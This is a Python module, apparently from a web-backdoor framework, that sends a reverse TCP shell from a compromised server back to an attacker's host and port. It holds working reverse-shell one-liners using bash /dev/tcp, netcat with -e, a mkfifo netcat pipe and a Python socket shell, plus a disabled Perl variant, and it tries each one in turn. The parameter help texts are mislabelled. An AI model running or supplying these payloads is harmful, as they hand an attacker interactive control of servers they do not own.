'''
Created on 28/ago/2011

@author: norby
'''

'''
Created on 22/ago/2011

@author: norby
'''

from core.module import Module, ModuleException
from core.vector import VectorList, Vector
from threading import Timer, Lock
from core.parameters import ParametersList, Parameter as P

classname = 'Reversetcp'
    
class Reversetcp(Module):
    """Send reverse TCP shell"""
    
    vectors = VectorList([
            Vector('shell.sh', 'devtcp', "/bin/bash -c \'/bin/bash 0</dev/tcp/%s/%s 1>&0 2>&0\'"),
            Vector('shell.sh', 'netcat-traditional', """nc -e /bin/sh %s %s"""),
            Vector('shell.sh', 'netcat-bsd', """rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f"""),
            #TODO: Seems broken
            #Vector('shell.sh', 'perl', """perl -e 'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'"""),
            Vector('shell.sh', 'python', """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""),
            ])
    
    params = ParametersList('Send reverse TCP shell ', vectors,
            P(arg='host', help='Local file path', required=True, pos=0),
            P(arg='port', help='Remote path', required=True, type=int, pos=1)
            )
    
    def __init__( self, modhandler , url, password):

        self.last_vector = None
        self.done = False

        Module.__init__(self, modhandler, url, password)
        
                
    def run_module(self, host, port):

        t = Timer(5.0, self.__check_module_state)
        t.start()

        vectors = self._get_default_vector2()
        if not vectors:
            vectors  = self.vectors.get_vectors_by_interpreters(self.modhandler.loaded_shells)
        for vector in vectors:
            
            self.last_vector = vector.name
            self.__execute_payload(vector, [host, port])

        if t.isAlive():
            t.cancel()
            
        if not self.done:
            self.last_vector = None
            self.mprint("[%s] No reverse backdoor method worked. Assure remote port is" % (self.name))
            self.mprint("[%s] listening using commands like \'nc -v -l -p <port>\'" % (self.name))

                

    def __execute_payload(self, vector, parameters):
        
        payload = self.__prepare_payload(vector, parameters)
        return self.modhandler.load(vector.interpreter).run({ 'cmd' : payload, 'stderr' :  'False'})
        
        
    def __prepare_payload( self, vector, parameters):

        if vector.payloads[0].count( '%s' ) == len(parameters):
            return vector.payloads[0] % tuple(parameters)
        else:
            raise ModuleException(self.name,  "Error payload parameter number does not corresponds")
    
    
    def __check_module_state(self):
        if self.last_vector and not self.done:
            self.params.set_and_check_parameters({'vector' : self.last_vector})
            self.mprint('[%s] Reverse backdoor seems connected. If needed end commands with semicolon' % (self.name, self.last_vector))
            self.done = True
           
        